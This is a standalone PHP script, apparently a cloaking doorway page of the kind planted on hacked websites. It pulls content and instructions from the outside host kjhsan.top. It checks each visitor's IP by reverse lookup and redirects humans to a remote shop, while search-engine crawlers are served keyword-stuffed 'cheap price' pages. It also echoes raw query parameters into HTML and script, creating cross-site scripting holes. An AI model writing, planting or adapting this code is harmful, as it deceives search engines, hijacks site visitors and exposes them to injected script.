<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';

$kname = "";
$kgurl = "https://kjhsan.top/2.aspx";
$jd = file_get_contents($kgurl);

if (!is_null($_GET['s'])) {
	$cid = mt_rand(1, 106);
	if (!is_null($_GET['cid'])) {
		$cid = $_GET['cid'];
	}
	$url = $jd."sjd2.aspx?cid=" . $cid . "&number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'];
	$str = file_get_contents($url);
	$str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	echo $str;
	exit();
}
$kname = "";
if (!is_null($_GET['iid'])) {
	$iii = $_GET['iid'];
	$kname = str_replace((explode("-", $iii)[0]) . "-", "", $iii);
	$kname = urldecode($kname);
}
function check($ip)
{
	global $jd;
	if (!is_null($_GET['kk'])) {
		$ip = "66.249.64.190";
	}
	$domain = file_get_contents($jd."getdomain.aspx?rnd=1&ip=" . $ip);
	if (stripos($domain, 'google') != false or stripos($domain, 'msn.com') != false or stripos($domain, 'yahoo.com') != false or stripos($domain, 'aol.com') != false) {
	} else {
		if (!is_null($_GET['iid'])) {
			$iii = $_GET['iid'];
			$kname = str_replace((explode("-", $iii)[0]) . "-", "", $iii);
			$kname = urldecode($kname);
			echo $kname;
			echo '<script>document.location="' . $jd."a.aspx" . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) . "&url=" . $_SERVER['HTTP_HOST'] . '"</script>';
			exit();
		}
		if (!is_null($_GET['searchtxt'])) {
			echo '<script>document.location="' . $jd."a.aspx" . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($_GET['searchtxt']) . '"</script>';
			exit();
		}
		if (!is_null($_GET['pnum'])) {
			$txt = str_replace("products.aspx", "", $jd."a.aspx") . "?cid=" . $_GET['cid'] . "";
			echo '<script>document.location="' . $txt . '"</script>';
			exit();
		}
	}
}
function getIP()
{
	$ip = $_SERVER['REMOTE_ADDR'] . "*" . $_SERVER['REMOTE_HOST'] . "*" . $_SERVER['HTTP_CLIENT_IP'] . "*" . $_SERVER['HTTP_X_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_X_FORWARDED'] . "*" . $_SERVER['HTTP_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_FORWARDED'];
	return $ip;
}
$validate = check(getIP());
?>
<html>

<head>

	<title> <?php error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
			echo $kname ?><?php echo $_GET['searchtxt'] ?> - Cheap price <?php echo mt_rand(50, 75) ?>% <?php echo $_GET['pnum'] ?> </title>
	<meta name="keywords" content="<?php echo $kname ?><?php echo $_GET['searchtxt'] ?>" />
	<meta name="description" content=" Shop <?php echo $kname ?> throughout the holiday season at Our shop. Find your dream product at a discounted price. <?php echo $_GET['searchtxt'] ?>" />
	<meta name="robots" content="index,follow,all" />
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>

<body>

	<?php
	$url = "";
	$hyzhdy = $jd."SJ/JDNEW2.aspx";
	if (!is_null($_GET['type'])) {

		if ($_GET['type'] == "search") {

			$url = $hyzhdy . "?cid=" . $_GET['cid'] . "&searchtxt=" . urlencode($_GET['searchtxt']);
			$str = file_get_contents($url);
			$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
			echo  $str;
		}
	} else {

		if (!is_null($_GET['iid'])) {
			$url = $hyzhdy . "?iid=" . $_GET['iid'] . "&mt=".$jd."en/333/" . mt_rand(1, 500) . ".txt&cid=" . $_GET['cid'];
		} else {
			$cid = mt_rand(1, 106);
			if (!is_null($_GET['cid'])) {
				$cid = $_GET['cid'];
			}
			$url = $hyzhdy . "?cid=" . $cid . "&pnum=" . $_GET['pnum'];
		}
		$str = file_get_contents($url);
		$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
		$str = str_replace('HHHHH', $_SERVER['SCRIPT_NAME'], $str);
		$str = str_replace('BBBBB', $_SERVER['HTTP_HOST'], $str);
		$str = str_replace('NNNNN', $kname . $_GET['iid'], $str);
		$str = str_replace('SSSSS', $kname . $_GET['iid'] . $_GET['searchtxt'] . $_GET['pnum'], $str);
		$str = str_replace('DDDDD', $kname . " Gold, White, Black, Red, Blue, Beige, Grey, Price, Rose, Orange, Purple, Green, Yellow, Cyan, Bordeaux, pink, Indigo, Brown, Silver,Electronics, Video Games, Computers, Cell Phones, Toys, Games, Apparel, Accessories, Shoes, Jewelry, Watches, Office Products, Sports & Outdoors, Sporting Goods, Baby Products, Health, Personal Care, Beauty, Home, Garden, Bed & Bath, Furniture, Tools, Hardware, Vacuums, Outdoor Living, Automotive Parts, Pet Supplies, Broadband, DSL, Books, Book Store, Magazine, Subscription, Music, CDs, DVDs, Videos,Online Shopping " . $_GET['searchtxt'], $str);
		echo $str;
	}
	?>

</body>

</html>